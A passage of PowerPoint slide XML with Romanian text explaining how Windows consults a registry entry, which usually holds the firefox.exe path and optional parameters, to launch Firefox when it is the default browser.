                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>dorește</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>să</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>deschidă</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> Firefox </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>prin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>intermediul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>meniului</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> de start </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>atunci</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>când</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> un link </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>resursă</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> de internet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>trebuie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>deschisă</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> cu Firefox, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>dacă</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>acesta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>este</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>setat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> ca browser implicit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="65000"/>
                  <a:lumOff val="35000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Mai exact, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>când</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> un program </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sau</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>proces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>solicită</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>deschiderea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>unei</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>pagini</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>și</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sistemul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>este</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>configurat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>să</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>folosească</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> Firefox ca browser web implicit, Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>va</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> consulta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>această</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>intrare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>în</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>registru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>pentru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>afla</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> cum </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>să</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>lanseze</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> Firefox. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Comanda</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>specificată</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>această</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> cale de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>registru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>va</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> include, de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>obicei</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>calea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>către</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>executabilul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> Firefox (firefox.exe) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>și</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>opțional</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>parametri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> care </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="65000"/>
                    <a:lumOff val="35000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>indică</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
